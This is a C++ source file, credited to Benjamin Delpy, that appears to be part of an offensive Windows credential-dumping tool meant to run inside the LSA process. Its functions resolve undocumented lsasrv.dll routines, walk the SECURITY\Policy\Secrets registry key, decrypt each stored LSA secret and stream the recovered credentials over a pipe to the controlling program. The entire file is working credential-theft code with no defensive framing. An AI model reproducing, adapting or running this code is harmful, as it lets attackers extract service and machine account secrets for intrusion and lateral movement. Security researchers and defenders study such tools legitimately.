/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by-nc-sa/3.0/
	This file  : http://creativecommons.org/licenses/by/3.0/
*/
#include "secrets.h"

PLSA_I_OPEN_POLICY_TRUSTED LsaIOpenPolicyTrusted = reinterpret_cast<PLSA_I_OPEN_POLICY_TRUSTED>(NULL);
PLSA_R_OPEN_SECRET LsarOpenSecret = reinterpret_cast<PLSA_R_OPEN_SECRET>(NULL);
PLSA_R_QUERY_SECRET LsarQuerySecret = reinterpret_cast<PLSA_R_QUERY_SECRET>(NULL);
PLSA_R_CLOSE LsarClose = reinterpret_cast<PLSA_R_CLOSE>(NULL);

bool searchSECFuncs()
{
	if(!(LsaIOpenPolicyTrusted && LsarOpenSecret && LsarQuerySecret && LsarClose))
	{
		if(HMODULE hLsasrv = GetModuleHandle(L"lsasrv"))
		{
			LsaIOpenPolicyTrusted = reinterpret_cast<PLSA_I_OPEN_POLICY_TRUSTED>(GetProcAddress(hLsasrv, "LsaIOpenPolicyTrusted"));
			LsarOpenSecret = reinterpret_cast<PLSA_R_OPEN_SECRET>(GetProcAddress(hLsasrv, "LsarOpenSecret"));
			LsarQuerySecret = reinterpret_cast<PLSA_R_QUERY_SECRET>(GetProcAddress(hLsasrv, "LsarQuerySecret"));
			LsarClose = reinterpret_cast<PLSA_R_CLOSE>(GetProcAddress(hLsasrv, "LsarClose"));
		}
		return (LsaIOpenPolicyTrusted && LsarOpenSecret && LsarQuerySecret && LsarClose);
	}
	else return true;
}

__kextdll bool __cdecl getSECFunctions(mod_pipe * monPipe, vector<wstring> * mesArguments)
{
	wostringstream monStream;
	monStream << L"** lsasrv.dll ** ; Research status : " << (searchSECFuncs() ? L"OK :)" : L"KO :(") << endl << endl <<
		L"@LsaIOpenPolicyTrusted = " << LsaIOpenPolicyTrusted << endl <<
		L"@LsarOpenSecret        = " << LsarOpenSecret << endl <<
		L"@LsarQuerySecret       = " << LsarQuerySecret << endl <<
		L"@LsarClose             = " << LsarClose << endl;
	return sendTo(monPipe, monStream.str());
}

__kextdll bool __cdecl getSecrets(mod_pipe * monPipe, vector<wstring> * mesArguments)
{
	if(searchSECFuncs())
	{
		bool sendOk = true;
		wstring message;
		LSA_HANDLE hPolicy;
		
		if(NT_SUCCESS(LsaIOpenPolicyTrusted(&hPolicy)))
		{
			HKEY hKeysSecrets;
			if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SECURITY\\Policy\\Secrets", 0, KEY_READ, &hKeysSecrets) == ERROR_SUCCESS)
			{
				DWORD nbKey, maxKeySize;
				if(RegQueryInfoKey(hKeysSecrets, NULL, NULL, NULL, &nbKey, &maxKeySize, NULL, NULL, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
				{
					for(DWORD i = 0; (i < nbKey) && sendOk; i++)
					{
						DWORD buffsize = (maxKeySize+1) * sizeof(wchar_t);
						LSA_UNICODE_STRING monNomSecret = {0, 0, new wchar_t[buffsize]};
						
						if(RegEnumKeyEx(hKeysSecrets, i, monNomSecret.Buffer, &buffsize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
						{
							monNomSecret.Length = monNomSecret.MaximumLength = static_cast<USHORT>(buffsize * sizeof(wchar_t));
							message.assign(L"\nSecret     : "); message.append(mod_text::stringOfSTRING(monNomSecret)); message.push_back(L'\n');
							
							LSA_HANDLE hSecret;
							if(NT_SUCCESS(LsarOpenSecret(hPolicy, &monNomSecret, SECRET_QUERY_VALUE, &hSecret)))
							{
								LSA_SECRET * monSecret = NULL;
								if(NT_SUCCESS(LsarQuerySecret(hSecret, &monSecret, NULL, NULL, NULL)))
								{
									message.append(L"Credential : "); message.append(mod_text::stringOrHex(reinterpret_cast<PBYTE>(monSecret->Buffer), monSecret->Length)); message.push_back(L'\n');
									LsaFreeMemory(monSecret);
								}
								else message.append(L"Error : Unable to retrieve the secret\n");
								LsarClose(&hSecret);
							}
							else message.append(L"Error : Unable to open the secret\n");
						}
						delete[] monNomSecret.Buffer;
						sendOk = sendTo(monPipe, message);
					}
					message.clear();
				} else message.assign(L"Error :Unable to obtain information on the secret register\n");
				RegCloseKey(hKeysSecrets);
			}
			else message.assign(L"Error : Unable to open Secrets key\n");
			LsarClose(&hPolicy);
		}
		else message.assign(L"Error : Unable to open policy\n");
		
		if(!message.empty())
			sendOk = sendTo(monPipe, message);
		
		return sendOk;
	}
	else return getSECFunctions(monPipe, mesArguments);
}
